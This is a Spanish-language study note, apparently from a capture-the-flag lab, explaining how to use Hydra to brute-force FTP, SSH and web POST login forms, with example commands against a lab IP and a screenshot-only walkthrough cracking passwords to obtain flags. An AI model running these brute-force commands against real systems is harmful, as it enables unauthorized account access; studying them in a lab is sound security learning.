---
layout: apunte
title: "2. Using Hydra"
---

<h2>Comandos Hydra</h2>
Las opciones que le pasemos a Hydra dependerán de qué servicio (protocolo) estemos intentando atacar. Por ejemplo, si queremos atacar el srvicio FTP con el nombre de usurio `user` y la lista de contraseñas `passlist.txt`, usaríamos el siguiente comendo:

`hydra -l user -P passlist.txt ftp://IP`

Aquí vemos algunos comandos tanto para SSH como para formulario web (POST).

---------------------------
<h2>SSH</h2>
`hydra -l <username> -P <full path to pass> <IP> -t <number> ssh`

| Opción | Descripción                              |
| ------ | ---------------------------------------- |
| `-l`   | Especifica el usuario para el loguin SSH |
| `-P`   | Indica la lista de contraseñas.          |
| `-t`   | Configura el número de hilos que usar    |
Por ejemplo, `hydra -l root -P passwords.txt 10.10.141.231 -t 4 ssh` lanzará un ataque de fuerza bruta contra el puerto 22 de la IP `10.10.141.231` con 4 hilos al usuario `root` con la lista de contraseñas `passwords.txt`.

-------------------------
<h2>POST Web Form</h2>
Podemos usar Hydra para bruteforcear formularios web también. Debemos saber qué tipo de petición se está haciendo (GET/POST).

`sudo hydra <username> <wordlist> <IP> http-post-form "<path>:<login_credentials>:<invalid_response>"`

| Opción                | Descripción                                                                                            |
| --------------------- | ------------------------------------------------------------------------------------------------------ |
| `-l`                  | El nombre de usuario para el login                                                                     |
| `-P`                  | La lista de contraseñas                                                                                |
| `http-post-form`      | El tipo de formulario es POST                                                                          |
| `<path>`              | La URL de login, por ejemplo `login.php`                                                               |
| `<login_credentials>` | El nombre de usuario y contraseña usados para loguearse, por ejemplo `username=^USER^&password=^PASS^` |
| `<invalid_response>`  | Parte de la respuesta cuando el login falla                                                            |
| `-V`                  | Output verboseado para cada intento                                                                    |
Por ejemplo:

`hydra -l username -P wordlist 10.10.141.231 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`

- La página de login es la dirección principal (`/`).
- El nombre de usuario es `username`.
- Dicho nombre de usuario reemplazará a ^USER^.
- La lista de contraseñas es `wordlist`.
- Dichas contraseñas sustituirán a ^PASS^.
- Finalmente, `F=incorrect` es una string que aparecerá si el login en el servidor falla.

-----------------------
<h2>Challenge</h2>
1. Abrimos la página dada:
   !**150.png**
2. Comprobamos el método, en este caso POST:
   !**151.png**
3. Lanzamos hydra con los parámetros correspondientes:
   !**152 1.png**
4. Obtenemos la contraseña:
   !**153.png**
5. Entramos y obtenemos la flag:
   !**154.png**
6. Usamos hydra para romper la contraseña ssh de molly:
   !**155.png**
7. Entramos por ssh y obtenemos la flag:
   !**156.png**

